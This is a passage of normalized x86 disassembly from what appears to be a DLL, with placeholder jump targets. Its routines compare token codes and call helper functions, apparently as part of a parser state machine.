xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0xc ]
mov [ ecx + 0x34 ] ebx
call sub_10074a00
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax edi
call sub_10073670
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_1001d270
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
sub_10077f70
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ esi ]
cmp edi 0x6
jne r-xdata
cmp edi 0x5
je r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_10073670
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_1001d270
add esp 0xc
pop edi
xor eax eax
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edi esi
call sub_100740e0
pop edi
mov eax 0x1
pop esi
pop ebp
retn
cmp edi 0x4
je r-xdata
test edi edi
jne r-xdata
push ebx
cmp edi 0x3
jne r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_10073670
mov edx [ edi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push edi
call sub_1001d270
add esp 0xc
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp edi 0x1
jne r-xdata
mov edi [ ebp + 0x8 ]
mov eax edi
call sub_10073470
mov ebx eax
mov eax edi
call sub_10073c00
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
cmp edi 0x2
jne r-xdata
mov eax [ esi + 0x18 ]
xor ecx ecx
test eax eax
sete cl
test ecx ecx
je r-xdata
cmp edi 0x1
jne r-xdata
mov eax [ esi + 0x18 ]
xor ecx ecx
cmp eax 0x71
sete cl
test ecx ecx
je r-xdata
xor ecx ecx
cmp eax 0x72
sete cl
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
push esi
push ecx
call sub_10075cb0
add esp 0x8
pop ebx
pop edi
pop esi
pop ebp
retn
push 0x96
push 0x73
push 0x74
push 0x6d
push 0x1
mov eax esi
call sub_10073730
add esp 0x14
test eax eax
je r-xdata
xor eax eax
cmp [ esi + 0x18 ] 0x6f
sete al
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x72
sete cl
test ecx ecx
je r-xdata
mov edi [ ebp + 0x8 ]
mov ebx [ edi + 0xc ]
push 0x72
mov eax edi
call sub_10073470
call sub_100737d0
add esp 0x4
test eax eax
je r-xdata
xor edx edx
cmp eax 0x71
sete dl
mov eax edx
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
push 0x72
jmp r-xdata
cmp edi 0x1
jne r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_10073670
push edi
mov eax 0x6f
call sub_10074820
add esp 0x8
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_10073670
mov ecx [ edi + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push edi
call sub_1001d270
add esp 0xc
mov esi edi
call sub_10074a60
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
xor ecx ecx
cmp eax 0x6f
sete cl
mov eax ecx
test eax eax
je r-xdata
mov edi [ ebp + 0x8 ]
push 0x72
mov eax edi
call sub_10073470
call sub_100737d0
add esp 0x4
test eax eax
jne r-xdata
push 0x71
mov eax edi
call sub_10073470
call sub_100737d0
add esp 0x4
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
mov ecx [ ebx + 0x8 ]
mov eax [ ecx + eax * 4 - 0x8 ]
push 0x71
call sub_100737d0
add esp 0x4
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
push 0x72
mov eax ebx
call sub_10073470
call sub_100737d0
add esp 0x4
test eax eax
je r-xdata
mov eax ebx
call sub_10073470
call sub_100737d0
add esp 0x4
test eax eax
je r-xdata
cmp edi 0x7
mov edi [ ebp + 0x8 ]
jne r-xdata
xor eax eax
cmp [ esi + 0x18 ] 0x7
sete al
test eax eax
je r-xdata
mov esi edi
call sub_10074a60
mov edx [ edi + 0xc ]
pop ebx
pop edi
mov [ edx + 0x34 ] 0x1
xor eax eax
pop esi
pop ebp
retn
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_1001d270
add esp 0x8
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
mov edi [ ebp + 0x8 ]
push edi
mov eax 0x6f
call sub_10074820
add esp 0x4
test eax eax
je r-xdata
mov eax edi
call sub_10073b20
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
push edi
mov eax esi
call sub_10073670
mov ecx [ edi + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push edi
call sub_1001d270
add esp 0xc
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
push edi
mov eax esi
call sub_10073670
mov edx [ edi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push edi
call sub_1001d270
add esp 0xc
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
mov eax edi
call sub_10073b20
push 0x71
mov eax ebx
call sub_10073b20
mov edi esi
call sub_10073f30
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov eax ebx
call sub_10073b20
mov eax edi
call sub_10073470
mov ecx [ edi + 0x4 ]
cmp eax [ ecx + 0x4 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
push eax
call sub_10075980
add esp 0x8
pop ebx
pop edi
pop esi
pop ebp
retn
mov esi edi
call sub_10074a60
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
push edi
mov eax esi
call sub_10073670
add esp 0x4
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_100782b0
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x96
push 0x68
push 0x67
push 0x66
push 0x64
push 0x65
push 0x63
push 0x5f
push 0x60
mov ebx 0x1
push ebx
mov eax esi
call sub_10073730
add esp 0x28
test eax eax
mov eax esi
je r-xdata
push 0x96
push 0x68
push 0x67
push 0x66
push 0x64
push 0x65
push 0x63
push 0x5f
push 0x60
push 0x0
call sub_10073730
add esp 0x28
test eax eax
je r-xdata
mov edi [ ebp + 0x8 ]
push edi
call sub_10073670
add esp 0x4
mov eax edi
call sub_10073b20
lea esi [ ebx + 0x6e ]
lea ecx [ ecx ]
mov ecx [ ebp + 0x8 ]
push esi
push ecx
call sub_10077f70
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_10073670
mov ecx [ esi + 0x18 ]
push 0x96
push 0x5f
push 0x0
push 0x0
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x4 ]
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
call sub_100744e0
add esp 0x1c
test eax eax
je r-xdata
mov eax edi
call sub_10073b20
jmp r-xdata
cmp [ eax + 0x1c ] esi
je r-xdata
mov edx [ edi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push edi
call sub_1001d270
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
call sub_10073b20
mov esi 0x6f
cmp [ eax ] ebx
jne r-xdata
mov eax edi
call sub_10073500
mov eax [ edi + 0xc ]
pop edi
mov [ eax + 0x34 ] ebx
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
call sub_10073b20
jmp r-xdata
cmp [ eax + 0x1c ] esi
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax edi
call sub_10073500
mov eax edi
call sub_10073500
mov ecx [ edi + 0xc ]
pop edi
pop esi
mov [ ecx + 0x34 ] ebx
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
sub_100783f0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
cmp ecx 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_10075cb0
add esp 0x8
pop ebp
retn
cmp ecx 0x1
jne r-xdata
push esi
cmp ecx 0x3
jne r-xdata
xor edx edx
cmp [ eax + 0x18 ] edx
sete dl
test edx edx
jne r-xdata
test ecx ecx
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
push ebx
mov ebx [ edx + 0x4 ]
mov esi eax
mov eax ecx
call sub_10073c00
pop ebx
mov eax 0x1
pop esi
pop ebp
retn
cmp ecx 0x2
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_10073670
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001d270
add esp 0xc
xor eax eax
pop esi
pop ebp
retn
cmp ecx 0x7
je r-xdata
xor edx edx
cmp [ eax + 0x18 ] edx
sete dl
test edx edx
je r-xdata
mov eax 0x1
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push esi
call sub_10073670
mov edx [ esi + 0xc ]
mov [ edx ] 0x6
mov eax [ esi + 0xc ]
add esp 0x4
mov [ eax + 0x34 ] 0x1
xor eax eax
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov [ edx ] 0x15
mov eax [ eax + 0xc ]
mov ecx [ eax + 0x8 ]
mov ecx [ ecx ]
mov eax [ eax + 0x68 ]
add ecx 0x10
call sub_10073ae0
sub_100784d0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
mov edx [ edi ]
cmp edx 0x4
jne r-xdata
push ebx
push esi
cmp edx 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
call sub_100740e0
mov eax 0x1
pop edi
pop ebp
retn
test edx edx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx + 0xc ]
test edx edx
jne r-xdata
cmp edx 0x1
jne r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ecx + edx * 4 - 0x4 ]
mov esi edi
mov ebx edx
call sub_10073c00
pop esi
pop ebx
mov eax 0x1
pop edi
pop ebp
retn
mov esi edi
mov ebx edx
call sub_10073c00
pop esi
lea eax [ ebx + 0x1 ]
pop ebx
pop edi
pop ebp
retn
cmp edx 0x2
jne r-xdata
mov eax [ edi + 0x18 ]
xor ecx ecx
test eax eax
sete cl
test ecx ecx
je r-xdata
cmp edx 0x1
jne r-xdata
xor eax eax
cmp [ edi + 0x18 ] 0x81
sete al
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x81
sete cl
mov eax ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push ecx
call sub_10075cb0
add esp 0x8
pop esi
pop ebx
pop edi
pop ebp
retn
mov esi [ ebp + 0x8 ]
cmp edx 0x7
jne r-xdata
mov eax [ edi + 0x18 ]
xor ecx ecx
cmp eax 0x80
sete cl
test ecx ecx
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x0
mov eax esi
call sub_10073470
call sub_100737d0
add esp 0x4
test eax eax
jne r-xdata
mov ebx [ ebp + 0x8 ]
call sub_10073f30
pop esi
pop ebx
mov eax 0x1
pop edi
pop ebp
retn
push esi
mov eax edi
call sub_10073670
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001d270
add esp 0xc
pop esi
pop ebx
xor eax eax
pop edi
pop ebp
retn
push 0x0
mov eax esi
call sub_10073470
call sub_100737d0
add esp 0x4
test eax eax
jne r-xdata
xor ecx ecx
cmp eax 0x82
sete cl
mov eax ecx
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
call sub_10073f30
mov eax ebx
call sub_10073b20
mov edx [ ebx + 0xc ]
mov [ edx + 0x38 ] 0x1
push esi
mov eax edi
call sub_10073670
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_1001d270
add esp 0xc
pop esi
pop ebx
xor eax eax
pop edi
pop ebp
retn
mov eax esi
call sub_10073b20
push 0x81
mov eax esi
call sub_10073470
call sub_100737d0
add esp 0x4
test eax eax
jne r-xdata
pop esi
pop ebx
mov eax 0x1
pop edi
pop ebp
retn
push esi
mov eax edi
call sub_10073670
add esp 0x4
pop esi
pop ebx
xor eax eax
pop edi
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edi
push edx
call sub_10075980
add esp 0x8
pop esi
pop ebx
pop edi
pop ebp
retn
pop esi
pop ebx
mov eax 0x1
pop edi
pop ebp
retn
mov ecx [ esi + 0xc ]
mov [ ecx ] 0x14
sub_100786b0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
push edi
cmp ecx 0x4
jne r-xdata
push esi
cmp ecx 0x3
jne r-xdata
mov edi eax
mov eax [ ebp + 0x8 ]
call sub_100740e0
mov eax 0x1
pop edi
pop ebp
retn
test ecx ecx
je r-xdata
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0xc ]
mov edx [ ecx + 0xc ]
test edx edx
je r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_10073670
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_1001d270
add esp 0xc
pop esi
xor eax eax
pop edi
pop ebp
retn
cmp ecx 0x1
jne r-xdata
push ebx
mov esi eax
mov ebx edx
mov eax edi
call sub_10073c00
pop ebx
pop esi
mov eax 0x1
pop edi
pop ebp
retn
mov ecx [ ecx + 0x8 ]
mov edx [ ecx + edx * 4 - 0x4 ]
cmp ecx 0x2
jne r-xdata
xor edx edx
cmp [ eax + 0x18 ] edx
sete dl
test edx edx
je r-xdata
cmp ecx 0x1
jne r-xdata
xor edx edx
cmp [ eax + 0x18 ] edx
sete dl
test edx edx
je r-xdata
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_10075cb0
add esp 0x8
pop esi
pop edi
pop ebp
retn
cmp ecx 0x7
je r-xdata
xor edx edx
cmp [ eax + 0x18 ] 0x82
sete dl
test edx edx
je r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov edx [ eax + 0x8 ]
mov ecx [ edx ]
mov eax [ eax + 0x68 ]
add ecx 0x10
call sub_10073ae0
mov eax [ esi + 0xc ]
mov [ eax ] 0x16
pop esi
mov eax 0x1
pop edi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_10075980
add esp 0x8
pop esi
pop edi
pop ebp
retn
sub_100787b0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov ecx [ esi ]
cmp ecx 0x3
jne r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
push ebx
mov ebx [ ecx ]
call sub_10073c00
pop ebx
mov eax 0x1
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push esi
push ecx
call sub_10075cb0
add esp 0x8
pop esi
pop ebp
retn
cmp ecx 0x4
je r-xdata
cmp ecx 0x1
jne r-xdata
cmp ecx 0x7
jne r-xdata
xor eax eax
cmp [ esi + 0x18 ] eax
sete al
test eax eax
jne r-xdata
push edi
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_10073670
mov edx [ edi + 0xc ]
add esp 0x4
mov [ edx ] 0x6
mov eax [ edi + 0xc ]
pop edi
mov [ eax + 0x34 ] 0x1
xor eax eax
pop esi
pop ebp
retn
lea eax [ ecx - 0x6 ]
pop esi
pop ebp
retn
sub_10078840
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov ecx [ esi ]
cmp ecx 0x3
jne r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
push ebx
mov ebx [ ecx ]
call sub_10073c00
pop ebx
mov eax 0x1
pop esi
pop ebp
retn
mov edx [ ebp + 0x8 ]
push esi
push edx
call sub_10075cb0
add esp 0x8
pop esi
pop ebp
retn
cmp ecx 0x4
je r-xdata
cmp ecx 0x1
jne r-xdata
cmp ecx 0x7
jne r-xdata
xor eax eax
cmp [ esi + 0x18 ] eax
sete al
test eax eax
jne r-xdata
cmp ecx 0x1
jne r-xdata
lea eax [ ecx - 0x6 ]
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_10073670
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_1001d270
add esp 0xc
pop edi
xor eax eax
pop esi
pop ebp
retn
xor eax eax
cmp [ esi + 0x18 ] 0x82
sete al
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push esi
push edx
call sub_10075980
add esp 0x8
pop esi
pop ebp
retn
sub_100788f0
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov ebx eax
mov esi [ ebx ]
push edi
cmp esi 0x6
ja r-xdata
push 0x96
push 0x33
push 0x1e
push 0x3a
push 0x94
push 0x5f
push 0x37
push 0x36
push 0x8a
push 0x29
push 0x41
push 0x2a
push 0x2b
push 0x3c
push 0x1b
push 0x19
push 0x1d
push 0x92
push 0x5
push 0x7a
push 0x84
push 0x1f
push 0x47
push 0x38
push 0x1a
push 0x1
push 0x14
push 0x13
push 0x12
push 0x11
push 0x10
push 0xf
push 0x49
push 0x28
push 0x21
push 0x20
push 0x26
push 0x22
push 0x32
push 0x8e
push 0x42
push 0xa
push 0x1c
push 0x8c
push 0x39
push 0x1
call sub_10073730
add esp 0xb8
test eax eax
jne r-xdata
jmp [ esi * 4 + jump_table_10078cb0 ]
mov edi [ ebp + 0x8 ]
push edi
mov eax ebx
call sub_10073670
add esp 0x4
cmp esi 0x1
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_10073670
mov [ ebx ] 0x5
mov eax [ r--data ]
mov [ ebx + 0x18 ] eax
add esp 0x4
mov edi ebx
mov eax esi
call sub_100740e0
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edi ebx
call sub_100740e0
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov edi ebx
mov eax esi
call sub_100740e0
push r--data
call sub_100386a0
mov ecx [ esi + 0xc ]
add esp 0x4
pop edi
pop esi
mov [ ecx + 0x3c ] 0x0
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx + 0xc ]
test edx edx
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_10073670
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_1001d270
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0xc ]
mov [ ecx + 0x34 ] 0x1
mov eax edi
call sub_10073470
call sub_10073820
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
jne r-xdata
cmp [ ebx + 0x18 ] 0x8f
sete al
test eax eax
je r-xdata
mov ecx [ ecx + 0x8 ]
mov edx [ ecx + edx * 4 - 0x4 ]
mov esi ebx
mov ebx edx
call sub_10073c00
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
mov ebx edx
call sub_10073c00
pop edi
pop esi
lea eax [ ebx + 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
call sub_10073470
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + ecx * 4 - 0x4 ]
xor esi esi
jmp r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea esi [ ebx + 0x1c ]
push r--data
push esi
call sub_10069d70
add esp 0x8
test eax eax
jne r-xdata
mov eax edi
call sub_10073b20
mov eax edi
call sub_10073470
mov esi eax
call sub_100737f0
test eax eax
jne r-xdata
mov edx [ edi + 0xc ]
mov edi [ edx + 0xc ]
dec edi
test edi edi
jle r-xdata
push edi
mov eax ebx
call sub_10073670
add esp 0x4
mov [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] eax
mov edx [ esi + 0x24 ]
mov [ ebp - 0xc ] edx
mov eax [ esi + 0x28 ]
lea ecx [ ebp - 0x14 ]
push ecx
mov [ ebp - 0x8 ] eax
call sub_10063950
lea edx [ ebp - 0xc ]
push edx
call sub_10063950
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0x4 ] 0x1
call sub_1003faa0
add esp 0x10
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
push r--data
push esi
call sub_10069d70
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
push ebx
push eax
mov eax [ edx * 4 + r--data ]
call eax
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
push edi
push eax
push ecx
push r--data
call sub_100386a0
lea edx [ ebp - 0x14 ]
push edx
lea eax [ ebp - 0xc ]
push eax
call sub_1003faa0
add esp 0x18
test eax eax
jne r-xdata
mov esi [ ecx + 0x20 ]
cmp esi 0x2
jne r-xdata
mov edx [ eax + 0x8 ]
mov ecx [ edx + ecx * 4 - 0x4 ]
push r--data
push esi
call sub_10069d70
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push r--data
call sub_100386a0
add esp 0x4
mov edi edi
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
mov eax [ edx + 0x8 ]
mov esi [ eax + edi * 4 - 0x4 ]
dec edi
cmp [ esi + 0x20 ] 0x0
je r-xdata
cmp esi 0x1
jne r-xdata
mov eax ebx
call sub_10074e60
jmp r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
call sub_10073b20
cmp eax esi
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0x24 ]
mov [ ebp - 0xc ] ecx
mov edx [ esi + 0x28 ]
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] edx
call sub_10063950
add esp 0x4
test edi edi
jg r-xdata
push edi
mov eax ebx
call sub_10074da0
push edi
mov eax esi
call sub_10073fd0
add esp 0x8
cmp [ ebx + 0x28 ] 0x0
je r-xdata
push edi
mov eax ebx
call sub_10074e00
add esp 0x4
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
call sub_10073b20
mov eax [ edi + 0xc ]
mov [ eax + 0x38 ] 0x1
sub_10078cd0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
push ebx
xor ebx ebx
mov ecx 0xa
cmp [ eax + 0x40 ] ebx
je r-xdata
mov [ eax + 0x40 ] ebx
cmp [ esi ] 0x2
jne r-xdata
cmp [ esi ] 0x4
jne r-xdata
mov eax [ edx + 0xc ]
mov ecx [ eax + 0xc ]
push edi
cmp ecx ebx
je r-xdata
xor eax eax
cmp [ esi + 0x18 ] ecx
sete al
cmp eax ebx
je r-xdata
cmp [ esi + 0x18 ] ecx
jne r-xdata
mov eax [ edx + 0xc ]
mov ecx [ eax ]
push esi
push edx
mov edx [ ecx * 4 + r--data ]
call edx
add esp 0x8
pop edi
pop ebx
pop ebp
retn
mov eax [ eax + 0x8 ]
mov edi [ eax + ecx * 4 - 0x4 ]
cmp edi ebx
je r-xdata
cmp [ esi ] 0x2
jne r-xdata
mov ecx [ edx + 0xc ]
mov [ ecx + 0x6c ] 0x1
mov [ eax + 0x40 ] ebx
mov ecx [ edx + 0xc ]
mov eax [ ecx + 0x68 ]
push eax
push edx
call sub_1001d270
add esp 0x8
mov eax 0x1
pop ebx
pop ebp
retn
mov ecx [ edi + 0x1c ]
push ecx
call sub_1004bc00
push eax
push r--data
call sub_100386a0
mov ebx [ edi + 0x20 ]
add esp 0xc
test ebx ebx
je r-xdata
xor eax eax
cmp [ esi + 0x18 ] ebx
sete al
cmp eax ebx
je r-xdata
mov edx [ ebp + 0x8 ]
push 0x96
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push edi
call sub_10073780
add esp 0x1c
test eax eax
je r-xdata
mov eax [ edx + 0xc ]
mov [ eax + 0x70 ] 0x1
cmp ebx 0x2
jne r-xdata
cmp ebx 0x2
jne r-xdata
mov eax edi
call sub_10073820
test eax eax
je r-xdata
cmp [ edi ] 0x1
jne r-xdata
mov eax [ esi ]
cmp eax 0x5
je r-xdata
cmp [ esi ] 0x7
je r-xdata
mov eax [ esi ]
cmp eax 0x1
je r-xdata
cmp [ edi + 0x1c ] 0x5b
jne r-xdata
cmp eax 0x4
je r-xdata
pop edi
pop ebx
mov eax esi
pop ebp
jmp sub_100788f0
cmp eax 0x5
je r-xdata
cmp [ esi ] 0x1
jne r-xdata
cmp eax 0x6
je r-xdata
cmp eax 0x6
je r-xdata
xor eax eax
cmp [ esi + 0x18 ] 0x5c
sete al
test eax eax
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp eax 0x4
je r-xdata
push 0x96
push 0x5a
push 0x59
push eax
mov eax esi
call sub_10073730
add esp 0x10
test eax eax
je r-xdata
sub_10078e40
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ esi ]
test edi edi
jne r-xdata
cmp edi 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_10073670
add esp 0x4
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp edi 0x2
jne r-xdata
xor eax eax
cmp [ esi + 0x18 ] eax
sete al
test eax eax
je r-xdata
cmp edi 0x4
je r-xdata
xor eax eax
cmp [ esi + 0x18 ] 0x8
sete al
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push esi
push ecx
call sub_10075cb0
add esp 0x8
pop edi
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push esi
push ecx
call sub_10075980
add esp 0x8
pop edi
pop esi
pop ebp
retn
cmp edi 0x3
je r-xdata
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_10073b20
mov edx [ esi + 0xc ]
lea eax [ edi - 0x1 ]
pop edi
mov [ edx ] 0x3
pop esi
pop ebp
retn
push 0x96
push 0x6
push 0x82
push 0x5
push 0x4
push 0x7e
push 0x8b
push 0x1
mov eax esi
call sub_10073730
add esp 0x20
test eax eax
jne r-xdata
push 0x96
push 0x8
push 0x1
push 0x1
mov eax esi
call sub_10073730
add esp 0x10
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_10073670
mov edx [ edi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push edi
call sub_1001d270
add esp 0xc
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp edi 0x2
jne r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_10073670
add esp 0x4
mov eax edi
call sub_10073b20
mov eax [ edi + 0xc ]
mov [ eax ] 0x3
mov ecx [ edi + 0xc ]
pop edi
mov [ ecx + 0x34 ] 0x1
xor eax eax
pop esi
pop ebp
retn
cmp [ esi + 0x18 ] 0x42
sete al
test eax eax
je r-xdata
sub_10078f80
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebx + 0xc ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ esi ]
mov [ ebp - 0x4 ] ecx
cmp edi 0x4
jne r-xdata
test edi edi
je r-xdata
mov edi esi
mov eax ebx
call sub_100740e0
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push ebx
mov eax esi
call sub_10073670
mov eax [ ebx + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push ebx
call sub_1001d270
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x3
jne r-xdata
cmp edi 0x1
jne r-xdata
mov eax [ ecx + 0xc ]
test eax eax
jne r-xdata
push 0x96
push 0x2
push 0x6
push 0x7
push 0x82
push 0x5
push 0x4
push 0x7e
push 0x8b
push 0x3
push 0x1
mov eax esi
call sub_10073730
add esp 0x2c
test eax eax
je r-xdata
mov eax [ esi + 0x18 ]
xor ecx ecx
test eax eax
sete cl
test ecx ecx
je r-xdata
mov edx [ ecx + 0x8 ]
mov eax [ edx + eax * 4 - 0x4 ]
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_10073c00
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_10073c00
lea eax [ edi - 0x2 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x1
jne r-xdata
push ebx
mov eax esi
call sub_10073670
mov edi ebx
call sub_100739c0
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x2c ]
lea edi [ eax + 0x8 ]
push edi
push ecx
push ebx
call sub_10006860
push esi
push ebx
call sub_10075980
mov edx [ ebp - 0x4 ]
mov esi eax
